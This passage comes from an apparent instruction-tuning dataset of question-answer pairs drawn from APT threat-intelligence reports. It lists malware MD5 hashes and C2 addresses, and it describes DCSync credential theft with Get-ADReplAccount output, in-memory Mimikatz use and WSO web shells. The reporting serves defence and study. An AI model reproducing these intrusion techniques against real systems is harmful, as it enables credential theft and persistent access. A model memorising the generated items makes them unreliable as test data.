exploit.msWord.cVe-2012-0158.ax\n> exploit.Win32.cVe-2012-0158.aa\nMedium Headline: 5.3 md5s of malicious files\nspear-phishing samples md5s:\n36ed86602661bb3a7a55e69fde90ee73 6eb5932b0ed20f11f1a887bcfbdde10f 059a7482efee3b2abf67c12d210cb2f7 e5954b8204eb321d20bed4a86b3cef34 63494c74db9bfc2bba3983698c952de9 b600089a93275fa93558695b707b87ad f4f14d4a1e34f62eeb9a90b5c8b2cfc1 0e2b10015fe52b7ea77a213f0c330557 29a420e52b56bfadf9f0701318524bef\nmalware modules:\n01d06f85fce63444c3563fe3bd20c004 03e8d330abc77a6a9d635d2e7c0e213a 08e5352a2416bd32a1c07f2d6c2f11fa 13b3cb819b460591c27e133e93fb8661 19a0693480c82f2b7fc8659d8f91717a\n1a70e1e36e6afa454f6457140ac3d2ec 1dcad7c8f56207b2c423353f0c328755 1f26e5f9b44c28b37b6cd13283838366 209c3b51cad30c85ca79a9f067ce04cd 22be9cca6e4ec3af327595b890a92fec 28e9faec9de3bbdeb65435bfc377d1f8 294da087e6329ae78c1a5fb42b999500 29a394a4ec8a30b5f36c7b874fc9fe10 2a43c23a17cd2bc9074a486c47444e7c 2ac8f77548e87b401767c7076adfa00d 2d0e4748d857c12184ed2c94c13ec1ae 2dc139d82a2a5bf027bcb6a40f75b3f4 33334d8dc36c4ee7739fe2f8b448da72 36f9a0e71f0b580333c61bfeaa88df39 37d588b289c65f10c256e43eba939a0a 382c1d692dd3cec9b046e5c0eeaf92e6 39c2b2ee24373bf1ef20faff958718bc 3b4cf5f1ff8c4187e41c6ab80f000491 3cb96fe79aa01c82ac68c54e88918e57 482f112cb7cb0293d99f8a7606acbe85 4968882f189236952fd38a11586b395a 4c8950da250ea135ee77a2644af414ba 524aed944b7f307eea5677eda7e2079a 54583ccc97c33e358510b563b1536e69 57f2374d9f2a787339b0c6a5b1008a72 5e35b31472a2e603a995198d8e8411ed 5e7c5e8d9f5864488ddf04b662d1ad8e 63f0f91e3ccf5dd00a455d3038a299f4 66684b8b82fb5318a41ab7e6abb8dd42 677f7c42f79a0a58760056529739fdd6 6afeec03c8f4bc78fa2b3ad27392b0e7 6d00e4f95fba02126b32bb74dc4fec55 6d49cdbade7541d46be3fb47a0f563bb 6de813a22b2b73e330085ec7c85e041b\n71f311a648348e7598eb55ab7618842c 723129912a2d0fb4aede7100071787ef 778c1764dd5c36c1eb96c49a8f8441e6 7b92e9d21bc4db838bc102b289f4fd5f 812d8e4d7a484bb363b139cfa08617e5 81591ae1c975b8a0b5ad5546a103992c 81d92e20f3078bd8e43b226308393e43 83429db9cc63196bf42c691cc09b7b84 852f562812305ad099372109f8e8b189 85865e048183849b255c92e609a5fa25 86cce64193a347b50329a32cdf08d198 89bfd463ca76b62c61a548778316567d 8ccea94fd83d9cb1b15a2a4befec24a2 8d3036a65ac2404d4562cdb927fd3d2c 8d78a9e3df1e19f9520f2bbb5f04cb54 8dc61b737990385473dca9bfc826727b 95113e04af14c23df607964fa9d83476 9b198f1e260700bdcb4740266cd35b3f 9c1c2825532b25e266d62db50952ab44 9c544da8c23826379d60581cce17a483 a0e350787e4134ea91ccb26d17cdf167 a1169fb2eb93616ced7536a53fb05648 a431d5786d9d95bc9d04df07cbefc0a2 a6d89df2a80675980fb3e4a9bcc162e2 a77456a160890a26a8f7c019c2e77021 aa6f8eff83aea3ff7b8f016e67f74dac af6649323daf6dbd3aef1b950588487c b3840ec1299517dacd6c18c71ff5bafc b8c99bc028a0a32288d858df7bf6bec1\nb990752f8266d7648070bea7e24d326f ba026e6190aee2c64ef62a4e79419bcf bea6e3481c0a06ce36600d8b3cc6155b c87e8a3ceefd93c7e431b753801c6bb6 cb9cc50b18a7c91cf4a34c624b90db5d cebaaad59f1616698dec4f14d76b4c9a d04a7f30c83290b86cac8d762dcc2df5 d218706eb07f2722ae4e0106cce27d52 d286c4cdf40e2dae5362eff562bccd3a d2fe88fff648a0bcbfdf0f0bd042a0a4 d354b71116961cad955ed11cb938ca32 d687cfde1c4ea77de1b92ea2f9e90ad5 d80c29813bfbc3cbcbd469249d49ebf3 d9c0ca95e49b113c5751fffdb20beb3f d9cf41b5d11e42dabf9470964d09c000 db6e36f962fdb58c8e9f8f9a781fda66 dc01df3c40cb4fb0bef448693475ea1b def612ad0554006378f185d3b56efb57 e51a4cc0272a98e9eddfec16667603f4 e5b1ffd2ecd7e610d07d093d65639da9 eb5761c410b5139f23235e9b67964495 eefc66a1e978dc9d825f28702106d4d5 efa23860086c5d12d3e6b918073c717f f3c5c20f5c45fc401484caf72753d778 fad8f37c9bd5420f49cfd5960a60fa24 fb3495715764cdaa547f2b040c0a9b1f fc3853c2383e2fbb2af381fd1277504d fe16c30782e2b16b07d5a3a1cf9dfb8f ff04126a5d61a10c81bfd0a6d0a643d0\nRead the text above and answer this question: In the context of the NetTraveler APT campaign, what are some of the key indicators of compromise (IoCs) related to network traffic? How might these IoCs be used to detect and mitigate the threat?",
    "output": "Key indicators of compromise (IoCs) related to network traffic in the NetTraveler APT campaign include specific IP addresses and domain names used for command and control (C&C) servers. Some examples of these IP addresses are 209.11.241.144, 121.12.124.69, and 61.178.77.111. These IPs are associated with C&C servers that the malware communicates with to receive commands and exfiltrate data. Additionally, domain names such as allen.w223.west263.cn, buynewes.com, and faceboak.net are used for C&C purposes. To detect and mitigate the threat, security professionals can monitor network traffic for connections to these IP addresses and domains. They can implement firewall rules to block traffic to these destinations and use intrusion detection systems (IDS) to alert on any suspicious activity involving these IoCs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the GhostNet cyber espionage network manage to penetrate and control high-value targets, including the private offices of the Dalai Lama and other Tibetan entities? Describe the modus operandi of the GhostNet system, including vectors, targeting, delivery mechanisms, data retrieval, and control systems.",
    "output": "The GhostNet cyber espionage network managed to penetrate and control high-value targets through a covert, difficult-to-detect, and elaborate cyber-espionage system. The modus operandi of the GhostNet system included various vectors, targeting, delivery mechanisms, data retrieval, and control systems. These components allowed the network to take full control of affected systems, making it highly effective in accessing sensitive and secret information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nRecently, media (1) reported of a targeted attack against the Israeli government, in the form of emails purporting to come from IDF Chief of Staff Benny Gantz with a malicious attachment.\nThis was an interesting development \u2013 Israel has, as far as we know, not been very targeted by spear phishing attacks like this.\nIn the following text we will usually be referring to the actual malware files we uncovered by their MD5 hash, which is a number that uniquely (well, uniquely enough) identifies the file in question.\n\nWhy was the recent spear phishing attack targeting the Israeli government significant, and how does it differ from previous cyber threats faced by Israel?",
    "output": "The recent spear phishing attack against the Israeli government was significant because it involved emails purporting to come from IDF Chief of Staff Benny Gantz with a malicious attachment. This type of attack is notable because, as far as known, Israel has not been frequently targeted by such sophisticated and tailored spear phishing campaigns in the past. This shift indicates a new tactic being employed against Israeli targets, highlighting the evolving nature of cyber threats and the need for heightened vigilance and advanced detection mechanisms.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What is the significance of the extensive list of domains associated with Dimnie, and how does this reflect on the malware's operational strategy?",
    "output": "The extensive list of domains associated with Dimnie indicates a sophisticated and well-resourced operation. By using a large number of domains, the operators behind Dimnie can evade detection and maintain persistence even if some domains are identified and blocked. This strategy allows the malware to continue communicating with its command and control servers, ensuring the continuity of its operations. Additionally, the variety of top-level domains (TLDs) and subdomains suggests that the attackers are trying to blend in with legitimate traffic, making it harder for security systems to detect and block their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: 4 Conclusion: David vs. Goliath in Cyberspace\nFinland and Estonia both rank among the world's most connected and cyber security-savvy countries.23 In both nations, there is a high degree of dependence on the internet, as well as a deep appreciation for the strategic nature of modern networks and the need to secure them. Therefore, both Finland and Estonia are at the forefront of the nations creating cyber norms in the world.24\nThe need to prepare defences against modern hybrid warfare forces governments, including those of Finland and Estonia, to take steps sooner rather than later. There will be conflicts in which the regular armed forces of a foreign state are not the most active participants. Some of the attacks may occur entirely in cyberspace, and the attackers might even remain anonymous. In the internet era, a wide range of national laws must be re-examined and contingencies rehearsed, so that decision-makers have the best possible tools to respond to the challenges of hybrid warfare in the future.\nRussia is far larger and more populous than both Finland and Estonia, but traditional notions of size \u2013 especially in the globalised internet era \u2013 is not the only determining factor on the cyber battlefield. Smaller countries such as Finland and Estonia, with a strong heritage of technical capability and experience, may possess some advantages that not even great powers could dream of. In the near term, Finland will continue to strengthen its defences independently, while Estonia will continue to emphasise NATO\u00b4s Article 5. In the long term, Finland and Estonia will continue to punch above their weight in the cyber domain \u2013 especially relative to their size.\nSmaller countries with a strong heritage of technical capability and experience may possess some advantages that not even great powers could dream of.\n22 Geoff Dyer. 'NATO shifts strategy in Europe to deal with Russia threat,' Financial Times, June 23, 2015.\n23 Global Cybersecurity Index and Cyberwellness Profiles. International Telecommunications Union, April 2015 http://www.itu. int/dms_pub/itu-d/opb/str/D-STR-SECU-2015-PDF-E.pdf.\n24 See e.g. Jarno Limn\u00e9ll. 'Can Finland Act As a Mediator on Cyber Norms?' Council on Foreign Relations, May 28, 2015, http:// blogs.cfr.org/cyber/2015/05/28/can-finland-act-as-a-mediator-on-cyber-norms/.\nAnswer this question: Why do smaller countries like Finland and Estonia have an advantage in the cyber domain despite their size, and how does this relate to their technical capabilities and experience?",
    "output": "Smaller countries like Finland and Estonia possess advantages in the cyber domain due to their strong heritage of technical capability and experience. This allows them to punch above their weight relative to their size. Despite being smaller in terms of population and geography compared to larger nations like Russia, these countries have a high degree of dependence on the internet and a deep appreciation for the strategic nature of modern networks and the need to secure them. Their advanced technical capabilities and experience enable them to create robust cyber defenses and contribute significantly to the development of cyber norms globally.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Cuba\nNorth Korea also has an interesting relationship with Cuba \u2013 one that includes supplying weapons and apparent attempts to illegally smuggle weapons. In 2013, a North Korean cargo ship on its return voyage was stopped near the Panama Canal. The ship was carrying surface-to-air missile parts, disguised as containers of sugar. In an attempt to save face, Cuba's Ministry of Foreign Affairs stated that the cargo included \"240 metric tons of obsolete defensive weapons -- two antiaircraft missile complexes Volga and Pechora, nine missiles in parts and spares, two Mig-21 Bis and 15 motors for this type of airplane, all of it manufactured in the mid-20th century -- to be\nrepaired and returned to Cuba.\" Experts said the cargo appeared to include a SNR-75 Fan Song fire-control radar system for an SA-2 missile, a Soviet-era missile system that was also used in Cuba.273 Following the incident, Fidel Castro credited former North Korean leader Kim Il-Sung for providing Cuba with weapons near the end of the Cold War. Weapons included 100,000 AK rifles and necessary ammunition.274\n262 http://www.v3.co.uk/v3-uk/news/2202493/iran-and-north-korea-sign-technology-treaty-to-combat-hostile-malware\n263 http://www.voanews.com/content/ties-among-north-korea-syria-iran-a-major-security-threat/1639769.html\n264http://38north.org/2014/08/aberger080514/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+38North+%2838+North%3A+ Informed+Analysis+of+North+Korea%29\n265 http://www.jewishjournal.com/opinion/article/hamas_global_support_network_must_be_targeted\n266 http://www.ibtimes.com/north-korea-send-hamas-weapons-communication-equipment-secret-arms-deal-1640088\n267 http://www.naenara.com.kp/en/kcc/\n268 http://www.armscontrol.org/factsheets/dprkchron\n269http://38north.org/2014/08/aberger080514/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+38North+%2838+North%3A+ Informed+Analysis+of+North+Korea%29\n270 http://www.jewishjournal.com/opinion/article/hamas_global_support_network_must_be_targeted\n271 http://www.ibtimes.com/north-korea-send-hamas-weapons-communication-equipment-secret-arms-deal-1640088\n272 http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/HPSR-Threat-Intelligence-Briefing-Episode-11/ba-p/6385243#.U_TiZGSwL-0\nWhile no apparent cyber relationship exists between North Korea and Cuba at this time, their track record for weapons trade means the potential for future collaboration in the cyber realm cannot be discounted.\nSmall Headline: 2013\n\uf0b7 \"March 20\" disk wiping attacks against South Korean media and financial institutions (March)293\n\uf0b7 Whois Team claims responsibility for attacking LG +U website with wiper malware and defacement, impacting South Korean media and financial institutions (March) 294 295\n\uf0b7 The New Romantic Cyber Army Team claims responsibility for the same attacks296\n\uf0b7 North Korea experiences 36-hour Internet outage. The cause was never definitively determined297\n\uf0b7 Anonymous launches #OpNorthKorea and targets North Korean websites (March)298\n\uf0b7 Anonymous allegedly hacks Uriminzokkiri and takes over its Twitter and Flickr pages 299 (April)\n\uf0b7 DarkSeoul attack on South Korean financial institutions (May)300\n\uf0b7 DarkSeoul DDoS attacks against South Korean government's DNS server (June)301\n\uf0b7 Details on Kimsuky malware, which targeted South Korean think tanks, first released (September)302\n\nQuestion: How did the 2013 incident involving a North Korean cargo ship near the Panama Canal highlight the potential for future cyber collaboration between North Korea and Cuba?\n\nAnswer:",
    "output": "The 2013 incident involved a North Korean cargo ship being stopped near the Panama Canal while carrying surface-to-air missile parts disguised as sugar. This event underscored the existing relationship between North Korea and Cuba in terms of weapons trade. Although no apparent cyber relationship existed at that time, the history of weapons trade indicated a potential for future collaboration in the cyber realm. This potential is based on the assumption that countries engaging in illicit activities, such as illegal arms trade, might also explore other forms of clandestine cooperation, including cyber warfare.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Approach\nIn order to obtain an initial set of actors, we perused the public archives from MISP, MITRE and the volunteer overview on Google Docs (resource 1-3 in the (<>)APPENDIX: Sources Used).\nGenerally, those, as well as media reports about threats, tend to lump everything together as aliases or synonyms \u2013 be it actual group names as tracked by research organizations, alleged (state) sponsor names, individual campaigns run by the group or specific pieces of malware used by the group. In this report, aliases are only listed as such if we could realistically determine it to be a fact, generally because we found which organization gave it that name. Everything else known about each actor has been split off into the relevant fields (sponsors, operations, tools).\nThe next step was to search our Risk Intelligence archive and after that, using our favorite Internet search engine for any public news about each and every actor to find all their campaigns and other activities that have been discovered. Analysis of those (thousands of) reports created the total overview of all tools used and where this actor has been observed in terms of countries and sectors.\nLastly, we went over the entire rich archive known as Malpedia to augment the set with malware names that had not appeared in the reports we saw.\nIn each step we took great care to make sure only Open Source Intelligence appeared in this document.\nMedium Headline: Legal Notice\nThis encyclopedia has been developed to catalog all known important adversaries to information security, with the aim to get a better understanding of international threats and to aid in faster response to future incidents. The content is based on the public knowledge of the security community and not solely the view of ThaiCERT and ETDA. It may not necessarily represent state-of-the-art and it might be updated from time to time.\nThird party sources are quoted as appropriate. ThaiCERT is not responsible for the content of the external sources, including external websites, nor their continued availability, referenced in this encyclopedia.\nWhere specific vendors or product names are given, those do not mean endorsement from ThaiCERT, but serve to document history only.\nThis encyclopedia is intended for educational and information purposes only. Neither ThaiCERT nor any person acting on its behalf is responsible for the use that might be made of the information contained in this encyclopedia. All information contained herein is provided on an \"As Is\" basis with no warranty whatsoever. ThaiCERT/ETDA does not promise any specific result, effects or outcome from the use of the information herein.\nThis encyclopedia is published under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License1 .\nCopyright \u00a9 Electronic Transactions Development Agency (Public Organization), 2019\nBig Headline: Advanced Persistent Threat (APT) Groups\nAn advanced persistent threat is a stealthy cyberattack in which a person or group gains unauthorized access to a network and remains undetected for an extended period. The term's definition was traditionally associated with nation-state sponsorship, but over the last few years we've seen multiple examples of non-nation state groups conducting large-scale targeted intrusions for specific goals.\nApart from all the APT groups profiled in this chapter, there are of course others, but no public information is available about them. Especially CrowdStrike has been very active in researching APT groups and mentioned the following names in passing, in summary reports: Big Panda, Foxy Panda, Hammer Panda, Impersonating Panda, Judgement Panda, Karma Panda, Keyhole Panda, Kryptonite Panda, Maverick Panda, Nomad Panda, Poisonous Panda, Predator Panda, Toxic Panda, Union Panda, Wet Panda, Corsair Jackal and Ghost Jackal.\n\nAnswer this question based on the above context: What precautions did the authors take to differentiate between aliases, group names, sponsor names, campaigns, and malware used by threat actors in the 'ThaiCERT-A_Threat_Actor_Encyclopedia(06-19-2019)', and why was this distinction important?",
    "output": "The authors carefully differentiated between aliases, group names, sponsor names, campaigns, and malware by listing aliases only if they could realistically determine them to be factual, generally because they found which organization gave the alias. This distinction was important to avoid confusion and to provide a clear and accurate profile of each threat actor. By separating these elements, the authors ensured that each aspect of the threat actor's activities was properly categorized, making it easier for cybersecurity experts to understand the full scope of the actor's operations and tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Credential Theft Using Get-ADReplAccount\nIn one example, the threat actor connected into the victim's environment via a VPN endpoint that did not have MFA enabled. Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10  PowerShell module to the system. The threat actor subsequently ran the DSInternals command Get-ADReplAccount targeting two of the victim's domains. This command uses the Microsoft Directory Replication Service (MS-DRSR) protocol and specifically the IDL_DRSGetNCChanges method to return account information from Active Directory such as the current NTLM password hashes and previous password hashes used for enforcing password reuse restrictions. A common name for this particular technique is DCSync.11\nAn example output from Get-AdReplAccount is below:\nDistinguishedName: CN=TestUser,OU=Admins,OU=Users,DC=demo,DC=local\nSid: S-1-5-21-1432446722-301123485-1266542393-2012\nGuid: 12321930-7c05-4011-8a3e-e0b9b6e04567\nSamAccountName: TestUser\nSamAccountType: User\nUserPrincipalName: TestUser@demo.local\nPrimaryGroupId: 513\nSidHistory:\nEnabled: True\nUserAccountControl: NormalAccount\nAdminCount: True\nDeleted: False\nLastLogonDate: 12/2/2021 1:41:46 PM\nDisplayName: TestUser\nGivenName: Test\nSurname: User\nDescription: Admin Account\nServicePrincipalName:\nSecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent,\nDiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative\nOwner: S-1-5-21-1432446722-301123485-1266542393-512\nSecrets\nNTHash: 84a058676bb6d7de4237e18f09b91156\nLMHash:\nNTHashHistory:\nHash 01: 84a058676bb6d7de4237e18f09b91156\nHash 02: e047ebb3b7c463928c928fca95ac0ac8\nHash 03: 6dc3cdb3e559ef00d3521351ace7477e\nHash 04: a88355849f35fe7336de23a4ca3e6a9e\nHash 05: de9bde95677672295349aa6e1e857704\nLMHashHistory:\nHash 01: 12227358dd7013c7dbdbd8fdcc0c6668\nHash 02: 6a028636a6f52491424586bb88357f7c\nHash 03: c13ef7347853dc3be7e7259fdc8818a1\nHash 04: 6635151746869ce485246037747adae1\nHash 05: 85543f498b007e07a3da662c8a9d450b\nSupplementalCredentials:\nClearText:\nNTLMStrongHash: de164e3465f163e846a5e1c22a5ac649\nKerberos:\nCredentials:\nDES_CBC_MD5\nKey: 0013364f00003915\nDES_CBC_CRC\nKey: 0013364f00003915\nOldCredentials:\nDES_CBC_MD5\nKey: 00002a46000004bc\nDES_CBC_CRC\nKey: 00002a46000004bc\nSalt: demo.localTestUser\nFlags: 0\nKerberosNew:\nCredentials:\nAES256_CTS_HMAC_SHA1_96\nKey: afd4d60e8d0920bc2f94d551f62f0ea2a17523bf2ff8ffb0fdade2a90389282f\nIterations: 4096\nAES128_CTS_HMAC_SHA1_96\nKey: f67c2bcbfcfa30fccb36f72dca22a817\nIterations: 4096\nDES_CBC_MD5\nKey: 00002f34000004ee\nIterations: 4096\nDES_CBC_CRC\nKey: 00002f34000004ee\nIterations: 4096\nOldCredentials:\nAES256_CTS_HMAC_SHA1_96\nKey: b430783ab4c957cf6a03d3d348af27264c0d872932650ffca712d9ebcf778b9f Iterations: 4096\nAES128_CTS_HMAC_SHA1_96\nKey: dc34bfd5e469edbeada77fac56aa35ae\nIterations: 4096\nDES_CBC_MD5\nKey: 0000345400000520\nIterations: 4096\nDES_CBC_CRC\nKey: 0000345400000520\nIterations: 4096\nOlderCredentials:\nAES256_CTS_HMAC_SHA1_96\nKey: 26efd3593712e555f8366bb4b8aff097d09acd93c3a1b6d4ea03c578aad9e087 Iterations: 4096\nCreated:\nModified:\nCredentials:\nFigure 10. Get-ADReplAccount example output\nWhen executing the Get-ADReplAccount command, the threat actor specified the AD context to be targeted via the NamingContext parameter. This was necessary, as the threat actor was targeting multiple domains. The resulting output of each command was redirected to a text file and compressed as zip archives before exfiltration.\nThe fact that Get-ADReplAccount command includes not only the current NTLM hashes but also the hash history (i.e., hashes of previous passwords used by a user account) meant that the threat actor also had the ability to discover accounts that either reused the same passwords or used similar passwords when the account password was changed.\nBig Headline: Credential Refresh\nOn some investigations, the dwell time of the threat actor spanned years. Given this extended period, it is logical to assume that some credentials obtained by the threat actor would be rotated during normal business operations. To combat this, the threat actor periodically \"refreshed\" their credential set by performing credential theft activities in an already compromised environment. At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a different credential theft technique.\nOne of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory. While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256. CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the script's execution was logged automatically due to the use of specific keywords. CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.\nIn addition to refreshing the threat actor's credentials, the threat actor would also refresh their understanding of the victim's AD environment. Around the time when the threat actor executed Get-ADReplAccount , the threat actor also executed a renamed version of AdFind to output domain reconnaissance information. In this instance, AdFind was renamed to masquerade as a legitimate Windows binary. The usage of renamed AdFind is consistent with other industry reporting on this campaign.\nIn addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, including Get-ADUser and Get-ADGroupMember to query specific members in the directory. This information provided the adversary with a list of accounts possessing particular privileges \u2014 in this case, the ability to make VPN connections \u2014 that would be subject to later credential stealing attempts and leveraged to access the victim at a later time.\nBig Headline: Password Policies/Hygiene\nIn some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account. CrowdStrike determined that in these cases, administrative users had \"reset\" their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset. This was possible even though the customer's Active Directory was configured to require new passwords to be different from the previous five passwords for a given account. Unfortunately, this check only applies when a user is changing their password via the \"password change\" method \u2014 but if a \"password reset\" is performed (changing the password without knowing the previous password), this check is bypassed for an administrative user or a Windows account that has the Reset Password permission on a user's account object.12  Since the Get-ADReplAccount cmdlet described above included the NTHashHistory values (i.e., previous password hashes) for user accounts, CrowdStrike was able to verify that some administrative accounts indeed had the exact same password hash showing up multiple times in the password history, as well as in the current NTHash value.\nBig Headline: Close Out\nThe StellarParticle campaign, associated with the COZY BEAR adversary group, demonstrates this threat actor's extensive knowledge of Windows and Linux operating systems, Microsoft Azure, O365, and Active Directory, and their patience and covert skill set to stay undetected for months \u2014 and in some cases, years.\nA special thank you to the CrowdStrike Incident Response and CrowdStrike Intelligence teams for helping make this blog possible, especially Ryan McCombs, Ian Barton, Patrick Bennet, Alex Parsons, Christopher Romano, Jackson Roussin and Tom Goldsmith.\n\nWhat strategies did the threat actor employ to refresh their credentials and maintain access over extended periods in the StellarParticle campaign?",
    "output": "A: The threat actor employed several strategies to refresh their credentials and maintain access over extended periods. They periodically 'refreshed' their credential set by performing credential theft activities in an already compromised environment. One of the techniques identified was the use of a heavily obfuscated PowerShell script to execute Mimikatz in-memory, which encrypted the output using AES256. Additionally, the threat actor refreshed their understanding of the victim's AD environment by executing a renamed version of AdFind to output domain reconnaissance information. They also manually executed PowerShell cmdlets like Get-ADUser and Get-ADGroupMember to enumerate network information from AD, providing them with a list of accounts possessing particular privileges.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INDICATORS OF COMPROMISE\nIn my original story about the breach, I wasn't able to reveal all the data I'd gathered about the apparent source of the attacks and attackers. A key source in that story asked that I temporarily delay publishing certain details of the investigation, specifically those known as indicators of compromise (IOCs). Basically, IOCs are list of suspect Internet addresses, domain names, filenames and other curious digital clues that are thought to connect the victim with its attacker.\nI've been inundated all week with calls and emails from security experts asking for that very data, but sharing it wasn't my call. That is, until yesterday (8/12/16), when Visa published a \"merchant communication alert\" to some customers. In (PDF), Visa published IOCs that may be connected with the intrusion. These IOCs could be extremely useful to MICROS customers because the presence of Internet traffic to and from these online destinations would strongly suggest the organization's point-of-sale systems may be similarly compromised.\nSome of the addresses on this list from Visa are known to be associated with the Carbanak Gang, a group of Eastern European hackers that Russian security firm Kaspersky Labhas stolen more than $1 billion from banks and retailers. Here's the IOCs list from the alert Visa pushed out Friday:\nVisa warned merchants to check their systems for any communications to and from these Internet addresses and domain names associated with a Russian organized cybercrime gang called \"Carbanak.\"\nThankfully, since at least one of the addresses listed above (192.169.82.86) matched what's on my source's list, the source agreed to let me publish the entire thing. . I checked my source's list and found at least five Internet addresses that were seen in both the Oracle attack and in by ESET Security, a Slovakian antivirus and security company. [NB: If you are unskilled at safely visiting malicious Web sites and/or handling malware, it's probably best not to visit the addresses in the above-linked list.] Visa also mentioned a specific POS-malware threat in its alert called \"MalumPOS.\" According to researchers at Trend Micro, MalumPOS is malware designed to target point-of-sale systems in hotels and related industries. In fact, Trend that MalumPOS is set up to collect data specifically from point-of-sale systems running on Oracle's MICROS platform.\nIt should come as no surprise then that many of Oracle's biggest customers in the hospitality industry are starting to make noise, accusing Oracle of holding back key information that could help MICROS-based companies stop and clean up breaches involving malware and stolen customer credit card data.\nMedium Headline: \"Oracle's silence has been deafening,\" said Michael Blake, chief executive officer at HTNG, a trade association for hotels and technology.\n\"Oracle's silence has been deafening,\" said Michael Blake, chief executive officer at , a trade association for hotels and technology. \"They are still grappling and trying to answer questions on the extent of the breach. Oracle has been invited to the last three [industry] calls this week and they are still going about trying to reach each customer individually and in the process of doing so they have done nothing but given the lame advice of changing passwords.\" The hospitality industry has been particularly hard hit by point-of-sale compromises over the past two years. Last month, KrebsOnSecurity broke the news of (Kimpton appears to run MICROS products, but the company declined to answer questions for this story).\nKimpton joins a long list of hotel brands that have acknowledged card breaches over the last year, including (), , , and (), and . In many of those incidents, thieves had planted malicious software on the point-of-sale devices at restaurants and bars inside of the hotel chains. And, no doubt, many of those cash registers were run on MICROS systems.\nIf Oracle doesn't exactly know which \u2014 if any \u2014 of its MICROS customers had malware on their point-of-sale systems as a result of the breach, it may be because the network intruders didn't have any reason to interact with Oracle's customers via the MICROS portal after stealing usernames and passwords that would allow them to remotely access customer on-premises systems. In theory, at that point the fraudsters could have bypassed Oracle altogether from then on.\nBig Headline: BREACHED BY MULTIPLE ACTORS?\nAnother possibly interesting development in the Oracle breach story: There are indications that Oracle may have been breached by more than one cybercrime group. Or at least handed off from one to the other.\nLate this week, Thomas Fox-Brewster at Forbes noting that MICROS was just one of at least five point-of-sale companies that were recently hacked by a guy who \u2014 from an exhaustive review of his online chats \u2014 appears to have just sat himself down one day and decided to hack a bunch of point-of-sale companies.\nForbes quoted my old friend Alex Holden of saying he had evidence that hackers had breached at least 10 payment companies, and the story focuses on getting confirmation from the various other providers apparently breached by the same cybercriminal actor.\nHolden showed me multiple pages worth of chat logs between two individuals on a cybercrime forum [full disclosure: Holden's company lists me as an adviser, but I accept no compensation for that role, and he ignores most of my advice].\nThe discussion between the two hackers begins around July 15, 2016, and goes on for more than a week. In it, the two hackers have been introduced to one another through a mutual, trusted contact. For a while, all they discuss is whether the seller can be trusted to deliver the Oracle MICROS database and control over the Oracle MICROS customer ticketing portal.\nIn the end, the buyer is convinced by what he sees and agrees to pay the bitcoin equivalent of roughly USD $13,000 for access to Oracle's MICROS portal, as well as a handful of other point-of-sale Web sites. The buyer's bitcoin wallet and the associated transactions can be seen .\nA screen shot shared by one of the hackers involved in compromising Oracle's MICROS support portal. This\nscreen shot was taken of a similar Web shell the hackers placed on the Web site of another POS provider (this is not the shell that was on Oracle).\nAccording to the chat log, the hacker broke in by exploiting a file-upload function built into the MICROS customer support portal. From there the attackers were able to upload an attack tool known as a \".\" This is a crude but effective text-based control panel that helps the attacker install additional attack tools to harvest data from the compromised Web server (see screen shot above). The beauty of a Web shell is that the attacker can control the infected site using nothing more than a Web browser, using nothing more than a hidden login page and a password that only he knows.\nThe two hackers discussed and both viewed more than that were apparently left behind on the MICROS portal by the WSO shell they uploaded in mid-July (most of the malicious files ended in the file extension \"wso.aspx\"). The chat logs show the pair of miscreants proceeding to target another 9 online payment providers or point-of-sale vendors. Some of those companies were quoted in the Forbes piece having acknowledged a breach similar to the Web shell attack at Oracle. But none of them have anywhere near the size of Oracle's MICROS customer base.\nRead the text above and answer this question: Why might Oracle have difficulty determining the extent of the breach affecting its MICROS customers, and what implications does this have for affected organizations?",
    "output": "Oracle may have difficulty determining the extent of the breach affecting its MICROS customers because the network intruders might not have interacted with Oracle's customers via the MICROS portal after stealing usernames and passwords. Once the attackers obtained credentials that allowed them to remotely access customer on-premises systems, they could have bypassed Oracle altogether from then on. This means that Oracle might not have direct visibility into which customers were affected. The implications for affected organizations include potential delays in identifying and remediating breaches, as well as increased risk of further data theft and financial loss.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
